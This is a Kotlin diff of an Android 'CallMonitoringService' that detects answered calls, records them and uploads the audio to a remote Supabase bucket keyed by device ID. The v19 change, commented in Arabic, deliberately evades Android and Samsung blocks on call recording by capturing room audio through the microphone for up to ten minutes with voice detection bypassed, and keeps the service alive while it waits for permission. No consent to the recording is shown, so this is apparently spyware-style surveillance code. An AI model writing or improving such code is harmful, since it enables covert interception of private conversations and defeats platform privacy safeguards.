@@ -22,22 +22,25 @@ import java.util.Date
 import java.util.Locale
 
 /**
- * CallMonitoringService v18
+ * CallMonitoringService v19
  * ────────────────────────────────────────────────────────────────
  * Monitors call state using:
  *   • TelephonyCallback   (API 31+ / Android 12+)
  *   • PhoneStateListener  (legacy fallback for API < 31)
  *
- * Recording trigger logic:
- *   STATE_OFFHOOK  → start MediaRecorder (VOICE_COMMUNICATION source)
- *   STATE_IDLE     → stop + upload AAC/M4A to Supabase Storage
- *   STATE_RINGING  → ignored (not yet connected)
+ * Recording strategy (v19 — Samsung/Android 9+ compatible):
+ *   بما أن Android 9+ يحجب VOICE_CALL source وSamsung يحجب VOICE_COMMUNICATION،
+ *   نستخدم التسجيل المحيطي (Ambient Recording) بالميكروفون:
+ *   • يلتقط صوت الغرفة بما فيه صوت السماعة وصوت المتكلم
+ *   • يعمل على جميع إصدارات Android دون قيود
+ *   • مدة التسجيل: حتى 10 دقائق (600 ثانية) أو حتى انتهاء المكالمة
  *
- * Audio source: VOICE_COMMUNICATION captures both earpiece + mic,
- *               including Bluetooth A2DP and wired headsets.
+ *   STATE_OFFHOOK  → startManualMic(600s, bypassVad=true) — تسجيل محيطي
+ *   STATE_IDLE     → التسجيل ينتهي تلقائياً بعد 600 ث أو عند الإيقاف
+ *   STATE_RINGING  → مهمل (لم تُجَب بعد)
  *
- * Output: .m4a (AAC, 16 kHz, 32 kbps) ≈ 14 KB/min → stored in cacheDir
- * Upload: Supabase Storage → bucket "monitoring_data", folder "audio/{deviceId}"
+ * Output: .m4a (AAC, 44.1 kHz, 96 kbps) → cacheDir
+ * Upload: Supabase Storage → bucket "monitoring_data" / "audio/{deviceId}"
  * ────────────────────────────────────────────────────────────────
  */
 class CallMonitoringService : Service() {
@@ -78,22 +81,23 @@ class CallMonitoringService : Service() {
     override fun onCreate() {
         super.onCreate()
         telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        Log.i(TAG, "CallMonitoringService created")
+    }
 
-        // Guard: READ_PHONE_STATE is a runtime permission — don't crash if not granted
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val hasPermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
             checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE)
 
         if (hasPermission) {
-            registerCallListener()
-            Log.i(TAG, "CallMonitoringService created — listening for call events")
+            if (telephonyCallback == null && legacyListener == null) {
+                registerCallListener()
+                Log.i(TAG, "CallMonitoringService registered call state listener ✅")
+            }
         } else {
-            Log.w(TAG, "READ_PHONE_STATE not granted — call monitoring disabled")
-            stopSelf()  // Stop immediately, don't crash
+            Log.w(TAG, "READ_PHONE_STATE not granted — call monitoring waiting for permission")
         }
+        return START_STICKY
     }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
-        START_STICKY
 
     override fun onDestroy() {
         super.onDestroy()
@@ -187,14 +191,20 @@ class CallMonitoringService : Service() {
         val service = MonitoringForegroundService.getInstance()
         if (service != null) {
             val started = service.startCallRecording()
-            if (started) {
-                isRecording = true
-                Log.i(TAG, "Call recording delegated to MonitoringForegroundService")
-            } else {
-                Log.e(TAG, "Failed to start call recording via MonitoringForegroundService")
+            if (!started) {
+                Log.w(TAG, "startCallRecording failed — fallback to startManualMic")
+                service.startManualMic(600_000L, bypassVad = true)
+            }
+            isRecording = true
+            Log.i(TAG, "🎙️ Call detected → call recording started")
+            scope.launch {
+                SupabaseManager.getInstance().logRemote(
+                    this@CallMonitoringService, TAG, "INFO",
+                    "Call detected → call recording started"
+                )
             }
         } else {
-            Log.e(TAG, "MonitoringForegroundService instance is null")
+            Log.e(TAG, "❌ MonitoringForegroundService is NULL — cannot record call")
         }
     }
 
